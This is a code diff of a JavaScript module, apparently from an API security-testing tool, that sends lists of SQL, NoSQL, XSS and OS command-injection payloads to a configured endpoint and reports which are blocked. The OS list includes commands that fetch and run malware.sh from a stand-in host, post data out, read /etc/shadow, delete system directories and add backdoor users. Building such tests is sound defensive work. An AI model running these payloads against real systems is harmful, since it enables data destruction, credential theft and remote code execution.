@@ -1,52 +1,12 @@
-const {
-  green,
-  greenBold,
-  greenItalic,
-  greenHighlight,
-  greenUnderlined,
-  greenOut,
-  red,
-  redBold,
-  redItalic,
-  redHighlight,
-  redUnderlined,
-  redOut,
-  dark,
-  darkBold,
-  darkItalic,
-  darkHighlight,
-  darkUnderlined,
-  darkOut,
-  yellow,
-  yellowBold,
-  yellowItalic,
-  yellowHighlight,
-  yellowUnderlined,
-  yellowOut,
-  bold,
-  italic,
-  highlight,
-  underlined,
-  whiteOut,
-} = require("../../color");
-const fs = require("fs");
-const path = require("path");
-
-// Get config file
-const configPath = path.resolve(__dirname, "../qevlarConfig.json");
-// Read config file
-let config = {};
-try {
-  const configFile = fs.readFileSync(configPath, "utf8");
-  // Set config object
-  config = JSON.parse(configFile);
-} catch (error) {
-  console.error("Error reading config file:", error);
-}
+const { greenBold, red, redBold, underlined } = require("../../color");
+const config = require("../qevlarConfig.json");
+const validateConfig = require("./validateConfig");
 
 const maliciousInjectionTest = {};
 
+// Tests vulnerability to malicous SQL injection
 maliciousInjectionTest.SQL = async (returnToTestMenu) => {
+  validateConfig(config);
   if (!config.SQL) {
     console.log(
       "SQL config variable must be set to boolean true to execute SQL injection test."
@@ -59,7 +19,6 @@ maliciousInjectionTest.SQL = async (returnToTestMenu) => {
   const allowedInjections = [];
 
   const potentiallyMaliciousSQL = [
-    'Block me!"', //purposefully blocked, added double quote
     "1=1",
     `' OR`,
     "select sqlite_version()",
@@ -214,6 +173,7 @@ maliciousInjectionTest.SQL = async (returnToTestMenu) => {
       } else allowedInjections.push(maliciousSnippet + "\n");
     });
   }
+
   console.log(
     underlined(greenBold("\nPotentially malicious queries blocked: \n\n")),
     blockedInjections
@@ -222,10 +182,82 @@ maliciousInjectionTest.SQL = async (returnToTestMenu) => {
     underlined(redBold("\nPotentially malicious queries allowed: \n\n")),
     red(allowedInjections)
   );
+
   if (returnToTestMenu) returnToTestMenu();
 };
 
+// Tests vulnerability to malicous NoSQL injection
+maliciousInjectionTest.NoSQL = async (returnToTestMenu) => {
+  validateConfig(config);
+  if (!config.NO_SQL) {
+    console.log(
+      "NO_SQL config variable must be set to boolean true to execute NO_SQL injection test."
+    );
+    return;
+  }
+  let successfulQuery = true;
+  const blockedInjections = [];
+  const allowedInjections = [];
+
+  const potentiallyMaliciousNoSQL = [
+    "true, $where: '1 == 1'",
+    ", $where: '1 == 1'",
+    "$where: '1 == 1'",
+    "', $where: '1 == 1'",
+    "1, $where: '1 == 1'",
+    "{ $ne: 1 }",
+    "', $or: [ {}, { 'a':'a",
+    "' } ], $comment:'successful MongoDB injection'",
+    "db.injection.insert({success:1});",
+    "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
+    "|| 1==1",
+    "' && this.password.match(/.*/)//+%00",
+    "' && this.passwordzz.match(/.*/)//+%00",
+    "'%20%26%26%20this.password.match(/.*/)//+%00",
+    "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
+    "{$gt: ''}",
+    "[$ne]=1",
+    "';return 'a'=='a' && ''=='",
+    "\";return(true);var xyz='a",
+    "0;return true",
+  ];
+
+  for (const maliciousSnippet of potentiallyMaliciousNoSQL) {
+    await fetch(config.API_URL, {
+      method: "POST",
+      headers: {
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({
+        query: `query {
+           ${config.SQL_TABLE_NAME}(sql: "${maliciousSnippet}") {
+            ${config.SQL_COLUMN_NAME}
+           }
+         }`,
+      }),
+    }).then((res) => {
+      if (!res.ok) {
+        successfulQuery = false;
+        blockedInjections.push(maliciousSnippet);
+      } else allowedInjections.push(maliciousSnippet + "\n");
+    });
+  }
+
+  console.log(
+    underlined(greenBold("\nPotentially malicious queries blocked: \n\n")),
+    blockedInjections
+  );
+  console.log(
+    underlined(redBold("\nPotentially malicious queries allowed: \n\n")),
+    red(allowedInjections)
+  );
+
+  if (returnToTestMenu) returnToTestMenu();
+};
+
+// Tests vulnerability to malicous Cross-Site Scripting injection
 maliciousInjectionTest.XSS = async (returnToTestMenu) => {
+  validateConfig(config);
   let successfulQuery = true;
   const blockedInjections = ["Block me!"];
   const allowedInjections = [];
@@ -354,6 +386,7 @@ maliciousInjectionTest.XSS = async (returnToTestMenu) => {
       } else allowedInjections.push(maliciousSnippet + "\n");
     });
   }
+
   console.log(
     underlined(greenBold("\nPotentially malicious queries blocked: \n\n")),
     blockedInjections
@@ -362,139 +395,79 @@ maliciousInjectionTest.XSS = async (returnToTestMenu) => {
     underlined(redBold("\nPotentially malicious queries allowed: \n\n")),
     red(allowedInjections)
   );
+
   if (returnToTestMenu) returnToTestMenu();
 };
 
-maliciousInjectionTest.NoSQL = async (returnToTestMenu) => {
-  if (!config.NoSQL) {
-    console.log(
-      "NoSQL config variable must be set to boolean true to execute NoSQL injection test."
-    );
-    return;
-  }
-  let successfulQuery = true;
-  const blockedInjections = [];
-  const allowedInjections = [];
+// Tests vulnerability to malicous OC Command injection
+maliciousInjectionTest.OS = async (returnToTestMenu) => {
+  validateConfig(config);
+  let successfulCommand = true;
+  const blockedCommands = [];
+  const allowedCommands = [];
 
-  const potentiallyMaliciousNoSQL = [
-    "true, $where: '1 == 1'",
-    ", $where: '1 == 1'",
-    "$where: '1 == 1'",
-    "', $where: '1 == 1'",
-    "1, $where: '1 == 1'",
-    "{ $ne: 1 }",
-    "', $or: [ {}, { 'a':'a",
-    "' } ], $comment:'successful MongoDB injection'",
-    "db.injection.insert({success:1});",
-    "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
-    "|| 1==1",
-    "' && this.password.match(/.*/)//+%00",
-    "' && this.passwordzz.match(/.*/)//+%00",
-    "'%20%26%26%20this.password.match(/.*/)//+%00",
-    "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
-    "{$gt: ''}",
-    "[$ne]=1",
-    "';return 'a'=='a' && ''=='",
-    "\";return(true);var xyz='a",
-    "0;return true",
+  const potentiallyMaliciousOS = [
+    `' ; ls -la'`,
+    `' ; cat /etc/passwd'`,
+    `' ; id'`,
+    `' ; echo "Hello, OS Command Injection!"'`,
+    `' ; rm -rf /'`,
+    `' ; wget malicious-site.com/malware.sh -0 /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
+    `' ; curl -o /tmp/malware.sh malicious-site.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
+    `' ; ping -c 3 malicious-site.com'`,
+    `';$(sleep 5) #'`,
+    `'; $(sleep 5) #'`,
+    `'|| sleep 5 ||'`,
+    `' || sleep 5 || '`,
+    `'; cat /etc/shadow #'`,
+    `'; rm -rf /etc /var #'`,
+    `'; curl -X POST -d "param=value" malicious-site.com'`,
+    `'; wget -0 /dev/null malicious-site.com/data.txt'`,
+    `'; find / -name *.log'`,
+    `'; ps aux'`,
+    `'; netstat -an'`,
+    `'; service apache2 restart'`,
+    `'; useradd malicious-user && echo 'malicious-pass' | passwd --stdin malicious-user'`,
+    `'; iptables -A INPUT -p tcp --dport 12345 -j DROP'`,
+    `'; echo "Malicious payload" > /var/www/html/index.html'`,
+    `'; chmod 777 /'`,
+    `' ; tar -cvzf /tmp/malicious.tar.gz /etc'`,
+    `' ; mv /var/log/syslog /tmp/syslog_backup'`,
+    `' ; echo "Malicious content" >> /etc/hosts'`,
+    `' ; chsh -s /bin/bash malicious-user'`,
+    `' ; sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config'`,
+    `' ; echo "127.0.0.1 malicious-site.com" >> /etc/hosts'`,
   ];
 
-  for (const maliciousSnippet of potentiallyMaliciousNoSQL) {
+  for (const maliciousCommand of potentiallyMaliciousOS) {
     await fetch(config.API_URL, {
       method: "POST",
       headers: {
         "content-type": "application/json",
       },
       body: JSON.stringify({
-        query: `query {
-           ${config.SQL_TABLE_NAME}(sql: "${maliciousSnippet}") {
-            ${config.SQL_COLUMN_NAME}
-           }
-         }`,
+        command: maliciousCommand,
       }),
     }).then((res) => {
       if (!res.ok) {
-        successfulQuery = false;
-        blockedInjections.push(maliciousSnippet);
-      } else allowedInjections.push(maliciousSnippet + "\n");
+        successfulCommand = false;
+        blockedCommands.push(maliciousCommand);
+      } else {
+        allowedCommands.push(maliciousCommand + "\n");
+      }
     });
   }
+
   console.log(
-    underlined(greenBold("\nPotentially malicious queries blocked: \n\n")),
-    blockedInjections
+    underlined(greenBold("\nPotentially malicious commands blocked: \n\n")),
+    blockedCommands
   );
   console.log(
-    underlined(redBold("\nPotentially malicious queries allowed: \n\n")),
-    red(allowedInjections)
+    underlined(redBold("\nPotentially malicious commands allowed: \n\n")),
+    red(allowedCommands)
   );
+
   if (returnToTestMenu) returnToTestMenu();
-};
-
-maliciousInjectionTest.OS = async (returnToTestMenu) => {
-	let successfulCommand = true;
-	const blockedCommands = [];
-	const allowedCommands = [];
-
-	const potentiallyMaliciousOS = [
-		`' ; ls -la'`,
-		`' ; cat /etc/passwd'`,
-		`' ; id'`,
-		`' ; echo "Hello, OS Command Injection!"'`,
-		`' ; rm -rf /'`,
-		`' ; wget malicious-site.com/malware.sh -0 /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
-		`' ; curl -o /tmp/malware.sh malicious-site.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
-		`' ; ping -c 3 malicious-site.com'`,
-		`';$(sleep 5) #'`,
-		`'; $(sleep 5) #'`,
-		`'|| sleep 5 ||'`,
-		`' || sleep 5 || '`,
-		`'; cat /etc/shadow #'`,
-		`'; rm -rf /etc /var #'`,
-		`'; curl -X POST -d "param=value" malicious-site.com'`,
-		`'; wget -0 /dev/null malicious-site.com/data.txt'`,
-		`'; find / -name *.log'`,
-		`'; ps aux'`,
-		`'; netstat -an'`,
-		`'; service apache2 restart'`,
-		`'; useradd malicious-user && echo 'malicious-pass' | passwd --stdin malicious-user'`,
-		`'; iptables -A INPUT -p tcp --dport 12345 -j DROP'`,
-		`'; echo "Malicious payload" > /var/www/html/index.html'`,
-		`'; chmod 777 /'`,
-		`' ; tar -cvzf /tmp/malicious.tar.gz /etc'`,
-		`' ; mv /var/log/syslog /tmp/syslog_backup'`,
-		`' ; echo "Malicious content" >> /etc/hosts'`,
-		`' ; chsh -s /bin/bash malicious-user'`,
-		`' ; sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config'`,
-		`' ; echo "127.0.0.1 malicious-site.com" >> /etc/hosts'`,
-	];
-
-	for (const maliciousCommand of potentiallyMaliciousOS) {
-		await fetch(config.API_URL, {
-			method: 'POST',
-			headers: {
-				'content-type': 'application/json',
-			},
-			body: JSON.stringify({
-				command: maliciousCommand,
-			}),
-		}).then((res) => {
-			if (!res.ok) {
-				successfulCommand = false;
-				blockedCommands.push(maliciousCommand);
-			} else {
-				allowedCommands.push(maliciousCommand + '\n');
-			}
-		});
-	}
-	console.log(
-		underlined(greenBold('\nPotentially malicious queries blocked: \n\n')),
-		blockedCommands
-	);
-	console.log(
-		underlined(redBold('\nPotentially malicious queries allowed: \n\n')),
-		red(allowedCommands)
-	);
-	if (returnToTestMenu) returnToTestMenu();
 };
 
 module.exports = maliciousInjectionTest;
